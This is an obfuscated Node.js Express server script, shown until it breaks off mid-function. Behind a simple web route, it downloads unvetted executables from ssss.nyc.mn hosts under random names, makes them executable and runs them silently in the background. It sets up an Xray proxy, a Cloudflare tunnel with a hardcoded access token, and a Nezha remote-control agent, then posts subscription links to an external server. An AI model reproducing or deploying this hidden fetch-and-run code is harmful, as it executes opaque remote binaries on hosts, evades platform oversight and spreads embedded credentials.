const _0x578b8f=_0x4489;(function(_0x30bfe3,_0x4b7763){const _0x24daff={_0x587d96:0x206,_0x366ef2:0x26f,_0x1ca9ea:0x25f,_0xeccd9d:0x29c,_0x1154b6:0x25d,_0x1a89ed:0x211,_0x5307b0:0x27f},_0x235191=_0x4489,_0x2c94c4=_0x30bfe3();while(!![]){try{const _0xaf2c70=-parseInt(_0x235191(_0x24daff._0x587d96))/0x1*(-parseInt(_0x235191(0x214))/0x2)+-parseInt(_0x235191(_0x24daff._0x366ef2))/0x3*(parseInt(_0x235191(_0x24daff._0x1ca9ea))/0x4)+parseInt(_0x235191(0x20e))/0x5+-parseInt(_0x235191(0x283))/0x6*(parseInt(_0x235191(_0x24daff._0xeccd9d))/0x7)+-parseInt(_0x235191(0x210))/0x8*(parseInt(_0x235191(_0x24daff._0x1154b6))/0x9)+parseInt(_0x235191(_0x24daff._0x1a89ed))/0xa+-parseInt(_0x235191(0x20f))/0xb*(-parseInt(_0x235191(_0x24daff._0x5307b0))/0xc);if(_0xaf2c70===_0x4b7763)break;else _0x2c94c4['push'](_0x2c94c4['shift']());}catch(_0x50f3bc){_0x2c94c4['push'](_0x2c94c4['shift']());}}}(_0x431f,0xef1f0));const express=require(_0x578b8f(0x22d)),app=express(),axios=require(_0x578b8f(0x278)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x578b8f(0x1ea)),exec=promisify(require(_0x578b8f(0x289))[_0x578b8f(0x265)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x578b8f(0x1f2)][_0x578b8f(0x200)]||'',PROJECT_URL=process[_0x578b8f(0x1f2)][_0x578b8f(0x23e)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x578b8f(0x1f2)][_0x578b8f(0x274)]||_0x578b8f(0x1f5),SUB_PATH=process[_0x578b8f(0x1f2)]['SUB_PATH']||_0x578b8f(0x227),PORT=process[_0x578b8f(0x1f2)][_0x578b8f(0x222)]||process[_0x578b8f(0x1f2)]['PORT']||0xbb8,UUID=process[_0x578b8f(0x1f2)][_0x578b8f(0x25c)]||_0x578b8f(0x207),NEZHA_SERVER=process[_0x578b8f(0x1f2)][_0x578b8f(0x232)]||'',NEZHA_PORT=process[_0x578b8f(0x1f2)][_0x578b8f(0x281)]||'',NEZHA_KEY=process[_0x578b8f(0x1f2)][_0x578b8f(0x24f)]||'',ARGO_DOMAIN=process[_0x578b8f(0x1f2)][_0x578b8f(0x263)]||_0x578b8f(0x1ef),ARGO_AUTH=process[_0x578b8f(0x1f2)][_0x578b8f(0x236)]||'eyJhIjoiYmE2YzhkMjQxOGVjMThjZmZhY2U2ZDU3ZmJlOGI5MTIiLCJ0IjoiZGRmZDY4YjQtMjJhMC00Y2NiLTlhOGQtMzk0ZTNlNGEwM2MxIiwicyI6Ill6ZzBNVGhsWXpBdE5qTTBZaTAwWTJNNUxUaGhaR1l0TldVellUa3lZall4TW1KbCJ9',ARGO_PORT=process[_0x578b8f(0x1f2)]['ARGO_PORT']||0x1f41,CFIP=process[_0x578b8f(0x1f2)][_0x578b8f(0x2a6)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x578b8f(0x25a)]||0x1bb,NAME=process[_0x578b8f(0x1f2)][_0x578b8f(0x257)]||'';!fs[_0x578b8f(0x221)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x578b8f(0x228)](FILE_PATH+'\x20is\x20created')):console[_0x578b8f(0x228)](FILE_PATH+_0x578b8f(0x286));function generateRandomName(){const _0x4a864e={_0x1a3f86:0x230},_0x292a5b=_0x578b8f,_0x1536b3=_0x292a5b(0x1e5);let _0x28a8bf='';for(let _0x1678c1=0x0;_0x1678c1<0x6;_0x1678c1++){_0x28a8bf+=_0x1536b3[_0x292a5b(_0x4a864e._0x1a3f86)](Math[_0x292a5b(0x269)](Math['random']()*_0x1536b3[_0x292a5b(0x238)]));}return _0x28a8bf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x578b8f(0x28b)](FILE_PATH,npmName),phpPath=path[_0x578b8f(0x28b)](FILE_PATH,phpName),webPath=path[_0x578b8f(0x28b)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x578b8f(0x28b)](FILE_PATH,_0x578b8f(0x243)),listPath=path[_0x578b8f(0x28b)](FILE_PATH,_0x578b8f(0x26c)),bootLogPath=path[_0x578b8f(0x28b)](FILE_PATH,_0x578b8f(0x1fa)),configPath=path[_0x578b8f(0x28b)](FILE_PATH,_0x578b8f(0x268));function _0x4489(_0x3c8571,_0x1f702c){const _0x431f51=_0x431f();return _0x4489=function(_0x448955,_0x4cec50){_0x448955=_0x448955-0x1e4;let _0x1832f2=_0x431f51[_0x448955];return _0x1832f2;},_0x4489(_0x3c8571,_0x1f702c);}function deleteNodes(){const _0x151efc={_0x7b103:0x218,_0x2b0775:0x220,_0x23ed95:0x252,_0x41c9a1:0x242,_0x379792:0x1e6,_0x3c7022:0x28a},_0x48a29f=_0x578b8f;try{if(!UPLOAD_URL)return;if(!fs[_0x48a29f(0x221)](subPath))return;let _0x36e0eb;try{_0x36e0eb=fs[_0x48a29f(0x298)](subPath,_0x48a29f(_0x151efc._0x7b103));}catch{return null;}const _0x586e2d=Buffer[_0x48a29f(_0x151efc._0x2b0775)](_0x36e0eb,_0x48a29f(0x24a))[_0x48a29f(0x24b)]('utf-8'),_0x1e6b54=_0x586e2d[_0x48a29f(0x217)]('\x0a')[_0x48a29f(_0x151efc._0x23ed95)](_0x252156=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x48a29f(0x299)](_0x252156));if(_0x1e6b54[_0x48a29f(0x238)]===0x0)return;return axios[_0x48a29f(_0x151efc._0x41c9a1)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x1e6b54}),{'headers':{'Content-Type':_0x48a29f(_0x151efc._0x379792)}})[_0x48a29f(_0x151efc._0x3c7022)](_0x3534e5=>{return null;}),null;}catch(_0x631a6b){return null;}}function cleanupOldFiles(){const _0x243460={_0x249a65:0x215,_0xd89382:0x21a,_0x2dbda3:0x203},_0x8e426d=_0x578b8f;try{const _0x1260f0=fs['readdirSync'](FILE_PATH);_0x1260f0[_0x8e426d(0x277)](_0x4ce9c4=>{const _0x3fcc36=_0x8e426d,_0x5a2d18=path[_0x3fcc36(0x28b)](FILE_PATH,_0x4ce9c4);try{const _0x43b926=fs[_0x3fcc36(_0x243460._0x249a65)](_0x5a2d18);_0x43b926[_0x3fcc36(_0x243460._0xd89382)]()&&fs[_0x3fcc36(_0x243460._0x2dbda3)](_0x5a2d18);}catch(_0x49878b){}});}catch(_0x1030af){}}app[_0x578b8f(0x24e)]('/',function(_0xef6885,_0x5d6b5a){const _0x114e7d={_0x4a9788:0x266},_0x42b2db=_0x578b8f;_0x5d6b5a['send'](_0x42b2db(_0x114e7d._0x4a9788));});async function generateConfig(){const _0x4a17be={_0x695f5a:0x254,_0xefab62:0x21c,_0x26efbd:0x276,_0xba8edc:0x1e4,_0x3bb25a:0x21c,_0xefc27b:0x21c,_0x34ca3c:0x1e4,_0x409c9d:0x24c,_0x3f7860:0x219,_0x43c54e:0x290,_0x26b1c8:0x226},_0x2b24c4=_0x578b8f,_0x330ac3={'log':{'access':_0x2b24c4(0x253),'error':'/dev/null','loglevel':_0x2b24c4(0x21c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b24c4(_0x4a17be._0x695f5a),'settings':{'clients':[{'id':UUID,'flow':_0x2b24c4(0x246)}],'decryption':_0x2b24c4(_0x4a17be._0xefab62),'fallbacks':[{'dest':0xbb9},{'path':_0x2b24c4(0x208),'dest':0xbba},{'path':_0x2b24c4(_0x4a17be._0x26efbd),'dest':0xbbb},{'path':_0x2b24c4(0x219),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2b24c4(_0x4a17be._0xba8edc),'protocol':_0x2b24c4(0x254),'settings':{'clients':[{'id':UUID}],'decryption':_0x2b24c4(_0x4a17be._0x3bb25a)},'streamSettings':{'network':_0x2b24c4(0x231),'security':_0x2b24c4(_0x4a17be._0xefc27b)}},{'port':0xbba,'listen':_0x2b24c4(0x1e4),'protocol':_0x2b24c4(_0x4a17be._0x695f5a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2b24c4(0x21c)},'streamSettings':{'network':'ws','security':_0x2b24c4(0x21c),'wsSettings':{'path':_0x2b24c4(0x208)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b24c4(0x259),_0x2b24c4(0x2a0),_0x2b24c4(0x27b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2b24c4(0x1e4),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2b24c4(0x276)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b24c4(0x259),_0x2b24c4(0x2a0),_0x2b24c4(0x27b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2b24c4(_0x4a17be._0x34ca3c),'protocol':_0x2b24c4(_0x4a17be._0x409c9d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2b24c4(0x21c),'wsSettings':{'path':_0x2b24c4(_0x4a17be._0x3f7860)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b24c4(0x259),_0x2b24c4(0x2a0),_0x2b24c4(0x27b)],'metadataOnly':![]}}],'dns':{'servers':[_0x2b24c4(_0x4a17be._0x43c54e)]},'outbounds':[{'protocol':'freedom','tag':_0x2b24c4(_0x4a17be._0x26b1c8)},{'protocol':'blackhole','tag':_0x2b24c4(0x205)}]};fs[_0x2b24c4(0x28e)](path[_0x2b24c4(0x28b)](FILE_PATH,_0x2b24c4(0x268)),JSON[_0x2b24c4(0x1e7)](_0x330ac3,null,0x2));}function getSystemArchitecture(){const _0x4d0211={_0x4372f1:0x284,_0x56f037:0x241,_0x32e959:0x27c,_0x3d79d8:0x251,_0x202427:0x241},_0x4e0fa3=_0x578b8f,_0xe1367=os[_0x4e0fa3(_0x4d0211._0x4372f1)]();return _0xe1367===_0x4e0fa3(_0x4d0211._0x56f037)||_0xe1367===_0x4e0fa3(_0x4d0211._0x32e959)||_0xe1367===_0x4e0fa3(_0x4d0211._0x3d79d8)?_0x4e0fa3(_0x4d0211._0x202427):_0x4e0fa3(0x294);}function downloadFile(_0x4a5631,_0x356fb8,_0x328848){const _0x212f4d={_0x58a880:0x221,_0x33b0ba:0x28a},_0x40d189={_0x43d5be:0x292,_0x5bbca6:0x21e,_0x397521:0x212},_0x349613=_0x578b8f,_0x1bd11d=_0x4a5631;!fs[_0x349613(_0x212f4d._0x58a880)](FILE_PATH)&&fs[_0x349613(0x28f)](FILE_PATH,{'recursive':!![]});const _0x331498=fs[_0x349613(0x1fb)](_0x1bd11d);axios({'method':_0x349613(0x24e),'url':_0x356fb8,'responseType':_0x349613(0x1ed)})['then'](_0x41fce2=>{const _0x458482={_0x1ae730:0x21e,_0x315d0b:0x212},_0x182f26={_0x37a9de:0x20a,_0x4a89e6:0x228,_0x4f5405:0x21e,_0x47b80b:0x2a8},_0x2e6072=_0x349613;_0x41fce2[_0x2e6072(0x297)][_0x2e6072(0x20c)](_0x331498),_0x331498['on'](_0x2e6072(0x275),()=>{const _0x3e03e7=_0x2e6072;_0x331498[_0x3e03e7(_0x182f26._0x37a9de)](),console[_0x3e03e7(_0x182f26._0x4a89e6)](_0x3e03e7(0x292)+path[_0x3e03e7(_0x182f26._0x4f5405)](_0x1bd11d)+_0x3e03e7(_0x182f26._0x47b80b)),_0x328848(null,_0x1bd11d);}),_0x331498['on'](_0x2e6072(0x1f7),_0x3359d9=>{const _0x2cb1ab=_0x2e6072;fs['unlink'](_0x1bd11d,()=>{});const _0x3d4903=_0x2cb1ab(0x292)+path[_0x2cb1ab(_0x458482._0x1ae730)](_0x1bd11d)+_0x2cb1ab(_0x458482._0x315d0b)+_0x3359d9['message'];console[_0x2cb1ab(0x1f7)](_0x3d4903),_0x328848(_0x3d4903);});})[_0x349613(_0x212f4d._0x33b0ba)](_0x261e88=>{const _0xaeceac=_0x349613,_0x43e370=_0xaeceac(_0x40d189._0x43d5be)+path[_0xaeceac(_0x40d189._0x5bbca6)](_0x1bd11d)+_0xaeceac(_0x40d189._0x397521)+_0x261e88['message'];console['error'](_0x43e370),_0x328848(_0x43e370);});}async function downloadFilesAndRun(){const _0x566790={_0x258d1e:0x228,_0x1edd87:0x240,_0x2639c8:0x216,_0x116897:0x1f0,_0x104d30:0x24d,_0x39468e:0x293,_0x56ea75:0x261,_0x388555:0x271,_0x18bc77:0x28e,_0x2fa509:0x1ff,_0x37321f:0x249,_0x9248fc:0x247,_0x40ae84:0x260,_0x2e13d7:0x20d,_0x3d57aa:0x2a4,_0x5e95e5:0x280,_0xc1d8fd:0x20d,_0x395526:0x1eb,_0x5e90be:0x1f7,_0x1ee902:0x221,_0x397338:0x204,_0x530d0f:0x285,_0x5bc9ed:0x20d},_0x540c52={_0x27398c:0x221},_0x176582={_0x42a656:0x1f4},_0x5db54d=_0x578b8f,_0x3c29b4=getSystemArchitecture(),_0x358b7d=getFilesForArchitecture(_0x3c29b4);if(_0x358b7d[_0x5db54d(0x238)]===0x0){console[_0x5db54d(_0x566790._0x258d1e)](_0x5db54d(0x26b));return;}const _0x12dcc8=_0x358b7d[_0x5db54d(0x2a1)](_0x218d73=>{return new Promise((_0x46cdcf,_0x4230d6)=>{const _0x1536ac=_0x4489;downloadFile(_0x218d73[_0x1536ac(0x2a3)],_0x218d73[_0x1536ac(_0x176582._0x42a656)],(_0x3ce211,_0x10deb3)=>{_0x3ce211?_0x4230d6(_0x3ce211):_0x46cdcf(_0x10deb3);});});});try{await Promise[_0x5db54d(0x2a2)](_0x12dcc8);}catch(_0x5f5b89){console['error'](_0x5db54d(_0x566790._0x1edd87),_0x5f5b89);return;}function _0x4c1291(_0x16348d){const _0x59e02f=_0x5db54d,_0x2ee2b2=0x1fd;_0x16348d[_0x59e02f(0x277)](_0x1ab363=>{const _0x26e80d={_0x294b9f:0x1f7,_0x5a6c08:0x235},_0x14c240=_0x59e02f;fs[_0x14c240(_0x540c52._0x27398c)](_0x1ab363)&&fs[_0x14c240(0x29f)](_0x1ab363,_0x2ee2b2,_0x37f91c=>{const _0x272647=_0x14c240;_0x37f91c?console[_0x272647(_0x26e80d._0x294b9f)](_0x272647(0x279)+_0x1ab363+':\x20'+_0x37f91c):console[_0x272647(0x228)](_0x272647(_0x26e80d._0x5a6c08)+_0x1ab363+':\x20'+_0x2ee2b2[_0x272647(0x24b)](0x8));});});}const _0x4da977=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c1291(_0x4da977);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xc395a0=NEZHA_SERVER[_0x5db54d(_0x566790._0x2639c8)](':')?NEZHA_SERVER[_0x5db54d(0x217)](':')['pop']():'',_0x3025a0=new Set([_0x5db54d(0x25e),'8443','2096',_0x5db54d(_0x566790._0x116897),_0x5db54d(_0x566790._0x104d30),'2053']),_0x2913a4=_0x3025a0[_0x5db54d(0x23f)](_0xc395a0)?'true':_0x5db54d(_0x566790._0x39468e),_0x777ae0='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5db54d(_0x566790._0x56ea75)+NEZHA_SERVER+_0x5db54d(_0x566790._0x388555)+_0x2913a4+_0x5db54d(0x288)+UUID;fs[_0x5db54d(_0x566790._0x18bc77)](path['join'](FILE_PATH,_0x5db54d(_0x566790._0x2fa509)),_0x777ae0);const _0x2b5e01=_0x5db54d(0x20d)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5db54d(_0x566790._0x37321f);try{await exec(_0x2b5e01),console[_0x5db54d(_0x566790._0x258d1e)](phpName+_0x5db54d(0x1fd)),await new Promise(_0x58b969=>setTimeout(_0x58b969,0x3e8));}catch(_0xd3afd7){console[_0x5db54d(0x1f7)]('php\x20running\x20error:\x20'+_0xd3afd7);}}else{let _0x38c11e='';const _0x5f012d=[_0x5db54d(0x25e),_0x5db54d(0x2a9),_0x5db54d(0x213),_0x5db54d(0x1f0),_0x5db54d(0x24d),_0x5db54d(_0x566790._0x9248fc)];_0x5f012d[_0x5db54d(0x216)](NEZHA_PORT)&&(_0x38c11e=_0x5db54d(_0x566790._0x40ae84));const _0x3b85d6=_0x5db54d(_0x566790._0x2e13d7)+npmPath+_0x5db54d(_0x566790._0x3d57aa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5db54d(0x1f1)+NEZHA_KEY+'\x20'+_0x38c11e+_0x5db54d(_0x566790._0x5e95e5);try{await exec(_0x3b85d6),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x2cbb79=>setTimeout(_0x2cbb79,0x3e8));}catch(_0x443547){console[_0x5db54d(0x1f7)](_0x5db54d(0x224)+_0x443547);}}}else console[_0x5db54d(0x228)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0xa6128c=_0x5db54d(_0x566790._0xc1d8fd)+webPath+_0x5db54d(_0x566790._0x395526)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xa6128c),console[_0x5db54d(_0x566790._0x258d1e)](webName+'\x20is\x20running'),await new Promise(_0x3666e0=>setTimeout(_0x3666e0,0x3e8));}catch(_0x2baccc){console[_0x5db54d(_0x566790._0x5e90be)](_0x5db54d(0x1f6)+_0x2baccc);}if(fs[_0x5db54d(_0x566790._0x1ee902)](botPath)){let _0x11d992;if(ARGO_AUTH[_0x5db54d(0x291)](/^[A-Z0-9a-z=]{120,250}$/))_0x11d992=_0x5db54d(_0x566790._0x397338)+ARGO_AUTH;else ARGO_AUTH[_0x5db54d(0x291)](/TunnelSecret/)?_0x11d992='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5db54d(0x270):_0x11d992=_0x5db54d(_0x566790._0x530d0f)+FILE_PATH+_0x5db54d(0x1ee)+ARGO_PORT;try{await exec(_0x5db54d(_0x566790._0x5bc9ed)+botPath+'\x20'+_0x11d992+_0x5db54d(0x250)),console[_0x5db54d(0x228)](botName+_0x5db54d(0x1fd)),await new Promise(_0x408ea1=>setTimeout(_0x408ea1,0x7d0));}catch(_0xb8703a){console['error']('Error\x20executing\x20command:\x20'+_0xb8703a);}}await new Promise(_0xec630b=>setTimeout(_0xec630b,0x1388));}function getFilesForArchitecture(_0x222288){const _0x51b46f={_0x1cfb3d:0x241,_0x11085e:0x225,_0x20e892:0x23a},_0x1ec996=_0x578b8f;let _0x2b7ef0;_0x222288===_0x1ec996(_0x51b46f._0x1cfb3d)?_0x2b7ef0=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1ec996(0x237)}]:_0x2b7ef0=[{'fileName':webPath,'fileUrl':_0x1ec996(0x264)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x572b36=_0x222288===_0x1ec996(0x241)?'https://arm64.ssss.nyc.mn/agent':_0x1ec996(_0x51b46f._0x11085e);_0x2b7ef0[_0x1ec996(_0x51b46f._0x20e892)]({'fileName':npmPath,'fileUrl':_0x572b36});}else{const _0x54da42=_0x222288===_0x1ec996(0x241)?_0x1ec996(0x21b):'https://amd64.ssss.nyc.mn/v1';_0x2b7ef0[_0x1ec996(_0x51b46f._0x20e892)]({'fileName':phpPath,'fileUrl':_0x54da42});}}return _0x2b7ef0;}function argoType(){const _0x1fbdfe={_0x241cf2:0x228,_0x43047f:0x282,_0x122d82:0x255},_0x3b0428=_0x578b8f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3b0428(_0x1fbdfe._0x241cf2)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x3b0428(0x26e))){fs[_0x3b0428(0x28e)](path['join'](FILE_PATH,_0x3b0428(0x29e)),ARGO_AUTH);const _0x18ed50=_0x3b0428(0x1fe)+ARGO_AUTH[_0x3b0428(0x217)]('\x22')[0xb]+_0x3b0428(0x295)+path[_0x3b0428(0x28b)](FILE_PATH,'tunnel.json')+_0x3b0428(_0x1fbdfe._0x43047f)+ARGO_DOMAIN+_0x3b0428(0x296)+ARGO_PORT+_0x3b0428(_0x1fbdfe._0x122d82);fs[_0x3b0428(0x28e)](path['join'](FILE_PATH,'tunnel.yml'),_0x18ed50);}else console[_0x3b0428(0x228)](_0x3b0428(0x229));}async function extractDomains(){const _0x396821={_0x48dea6:0x228,_0x5660eb:0x298,_0x220264:0x28b,_0x119d72:0x218,_0xf416a2:0x217,_0x1b4291:0x1e9,_0x199069:0x203,_0x13477e:0x285,_0x2179e8:0x250,_0x222dd4:0x1fd,_0x9031cc:0x1f7,_0x433c12:0x272},_0x118cc5={_0x2bcb72:0x24e,_0x4d834e:0x297,_0x25aef8:0x29d,_0x4e936b:0x297,_0x3ccb9a:0x1f9,_0x3f65a7:0x1ec,_0x55d1eb:0x29d,_0x50e43e:0x27d,_0x33eef:0x2a5},_0x93fe95={_0x1eefc6:0x230},_0xfaacef={_0x13ff07:0x256},_0x2f581c=_0x578b8f;let _0x18e1d5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x18e1d5=ARGO_DOMAIN,console[_0x2f581c(_0x396821._0x48dea6)](_0x2f581c(0x202),_0x18e1d5),await _0x154b16(_0x18e1d5);else try{const _0x32a556=fs[_0x2f581c(_0x396821._0x5660eb)](path[_0x2f581c(_0x396821._0x220264)](FILE_PATH,_0x2f581c(0x1fa)),_0x2f581c(_0x396821._0x119d72)),_0x457117=_0x32a556[_0x2f581c(_0x396821._0xf416a2)]('\x0a'),_0x307f53=[];_0x457117['forEach'](_0x5d4843=>{const _0x5d89fe=_0x2f581c,_0x17fbb9=_0x5d4843['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x17fbb9){const _0x161ca3=_0x17fbb9[0x1];_0x307f53[_0x5d89fe(_0xfaacef._0x13ff07)](_0x161ca3);}});if(_0x307f53[_0x2f581c(0x238)]>0x0)_0x18e1d5=_0x307f53[0x0],console[_0x2f581c(0x228)]('ArgoDomain:',_0x18e1d5),await _0x154b16(_0x18e1d5);else{console[_0x2f581c(0x228)](_0x2f581c(_0x396821._0x1b4291)),fs[_0x2f581c(_0x396821._0x199069)](path['join'](FILE_PATH,'boot.log'));async function _0x476440(){const _0x5655a3=_0x2f581c;try{process['platform']===_0x5655a3(0x245)?await exec(_0x5655a3(0x23d)+botName+_0x5655a3(0x21f)):await exec(_0x5655a3(0x20b)+botName[_0x5655a3(_0x93fe95._0x1eefc6)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x555374){}}_0x476440(),await new Promise(_0x1a3272=>setTimeout(_0x1a3272,0xbb8));const _0x9b3819=_0x2f581c(_0x396821._0x13477e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2f581c(0x20d)+botPath+'\x20'+_0x9b3819+_0x2f581c(_0x396821._0x2179e8)),console[_0x2f581c(0x228)](botName+_0x2f581c(_0x396821._0x222dd4)),await new Promise(_0x4dffe3=>setTimeout(_0x4dffe3,0xbb8)),await extractDomains();}catch(_0x2f2684){console[_0x2f581c(_0x396821._0x9031cc)](_0x2f581c(_0x396821._0x433c12)+_0x2f2684);}}}catch(_0x1bd809){console[_0x2f581c(0x1f7)](_0x2f581c(0x1fc),_0x1bd809);}async function _0x1106fa(){const _0x4280b3=_0x2f581c;try{const _0x53005b=await axios[_0x4280b3(_0x118cc5._0x2bcb72)](_0x4280b3(0x28d),{'timeout':0xbb8});if(_0x53005b[_0x4280b3(_0x118cc5._0x4d834e)]&&_0x53005b[_0x4280b3(_0x118cc5._0x4d834e)]['country_code']&&_0x53005b['data'][_0x4280b3(_0x118cc5._0x25aef8)])return _0x53005b[_0x4280b3(_0x118cc5._0x4e936b)]['country_code']+'_'+_0x53005b[_0x4280b3(0x297)][_0x4280b3(_0x118cc5._0x25aef8)];}catch(_0xba702){try{const _0x141c35=await axios[_0x4280b3(0x24e)](_0x4280b3(_0x118cc5._0x3ccb9a),{'timeout':0xbb8});if(_0x141c35['data']&&_0x141c35['data'][_0x4280b3(0x26a)]===_0x4280b3(_0x118cc5._0x3f65a7)&&_0x141c35[_0x4280b3(_0x118cc5._0x4d834e)]['countryCode']&&_0x141c35[_0x4280b3(0x297)][_0x4280b3(_0x118cc5._0x55d1eb)])return _0x141c35['data'][_0x4280b3(_0x118cc5._0x50e43e)]+'_'+_0x141c35[_0x4280b3(_0x118cc5._0x4d834e)]['org'];}catch(_0x54452d){}}return _0x4280b3(_0x118cc5._0x33eef);}async function _0x154b16(_0x41be80){const _0x25acbe=await _0x1106fa(),_0x1dd37a=NAME?NAME+'-'+_0x25acbe:_0x25acbe;return new Promise(_0xe8659d=>{const _0x2d6836={_0x1ceaec:0x258,_0x3f0bd5:0x2a0,_0x462bf2:0x29a,_0x208901:0x2a7,_0x41a100:0x220,_0x51394e:0x22c,_0x3fd759:0x228,_0xd1a76c:0x24b,_0x226351:0x28e,_0x57b3ea:0x21d,_0x3cfb72:0x24e},_0x17aeba={_0x31b62e:0x220,_0x2fb8d6:0x223,_0x3a5881:0x209,_0x11887a:0x26d};setTimeout(()=>{const _0x43795f=_0x4489,_0x4838da={'v':'2','ps':''+_0x1dd37a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x43795f(0x21c),'net':'ws','type':'none','host':_0x41be80,'path':_0x43795f(_0x2d6836._0x1ceaec),'tls':_0x43795f(_0x2d6836._0x3f0bd5),'sni':_0x41be80,'alpn':'','fp':_0x43795f(0x29b)},_0x1fd78a=_0x43795f(_0x2d6836._0x462bf2)+UUID+'@'+CFIP+':'+CFPORT+_0x43795f(0x22b)+_0x41be80+_0x43795f(0x233)+_0x41be80+_0x43795f(_0x2d6836._0x208901)+_0x1dd37a+_0x43795f(0x22a)+Buffer[_0x43795f(_0x2d6836._0x41a100)](JSON['stringify'](_0x4838da))[_0x43795f(0x24b)]('base64')+_0x43795f(0x248)+UUID+'@'+CFIP+':'+CFPORT+_0x43795f(_0x2d6836._0x51394e)+_0x41be80+_0x43795f(0x233)+_0x41be80+_0x43795f(0x25b)+_0x1dd37a+'\x0a\x20\x20\x20\x20';console[_0x43795f(_0x2d6836._0x3fd759)](Buffer[_0x43795f(0x220)](_0x1fd78a)[_0x43795f(_0x2d6836._0xd1a76c)](_0x43795f(0x24a))),fs[_0x43795f(_0x2d6836._0x226351)](subPath,Buffer[_0x43795f(_0x2d6836._0x41a100)](_0x1fd78a)['toString'](_0x43795f(0x24a))),console[_0x43795f(0x228)](FILE_PATH+_0x43795f(_0x2d6836._0x57b3ea)),uploadNodes(),app[_0x43795f(_0x2d6836._0x3cfb72)]('/'+SUB_PATH,(_0x356690,_0x4128b5)=>{const _0x506c6e=_0x43795f,_0x38d940=Buffer[_0x506c6e(_0x17aeba._0x31b62e)](_0x1fd78a)[_0x506c6e(0x24b)](_0x506c6e(0x24a));_0x4128b5[_0x506c6e(_0x17aeba._0x2fb8d6)]('Content-Type',_0x506c6e(_0x17aeba._0x3a5881)),_0x4128b5[_0x506c6e(_0x17aeba._0x11887a)](_0x38d940);}),_0xe8659d(_0x1fd78a);},0x7d0);});}}async function uploadNodes(){const _0x58e707={_0x192487:0x26a,_0x1c7417:0x228,_0x2b8a62:0x221,_0x1ef713:0x238,_0x4fb41c:0x242},_0x24c622=_0x578b8f;if(UPLOAD_URL&&PROJECT_URL){const _0x24efd7=PROJECT_URL+'/'+SUB_PATH,_0x215e7e={'subscription':[_0x24efd7]};try{const _0x31c3ee=await axios['post'](UPLOAD_URL+_0x24c622(0x28c),_0x215e7e,{'headers':{'Content-Type':_0x24c622(0x1e6)}});return _0x31c3ee&&_0x31c3ee[_0x24c622(_0x58e707._0x192487)]===0xc8?(console[_0x24c622(_0x58e707._0x1c7417)](_0x24c622(0x23b)),_0x31c3ee):null;}catch(_0x5a5d82){if(_0x5a5d82[_0x24c622(0x27e)]){if(_0x5a5d82[_0x24c622(0x27e)][_0x24c622(_0x58e707._0x192487)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24c622(_0x58e707._0x2b8a62)](listPath))return;const _0x17c0f8=fs['readFileSync'](listPath,'utf-8'),_0x10021d=_0x17c0f8['split']('\x0a')['filter'](_0x33f404=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x24c622(0x299)](_0x33f404));if(_0x10021d[_0x24c622(_0x58e707._0x1ef713)]===0x0)return;const _0x3a5180=JSON['stringify']({'nodes':_0x10021d});try{const _0x3c94c8=await axios[_0x24c622(_0x58e707._0x4fb41c)](UPLOAD_URL+_0x24c622(0x234),_0x3a5180,{'headers':{'Content-Type':_0x24c622(0x1e6)}});return _0x3c94c8&&_0x3c94c8[_0x24c622(0x26a)]===0xc8?(console[_0x24c622(0x228)](_0x24c622(0x27a)),_0x3c94c8):null;}catch(_0x2d75f8){return null;}}else return;}}function cleanFiles(){const _0x3b5018={_0xae8f04:0x256,_0x57becf:0x22f,_0xf22840:0x1f3,_0x6b71de:0x23c},_0xbe9da1={_0x474482:0x228},_0x552fb0={_0x3f6e63:0x201,_0xcb77d3:0x273};setTimeout(()=>{const 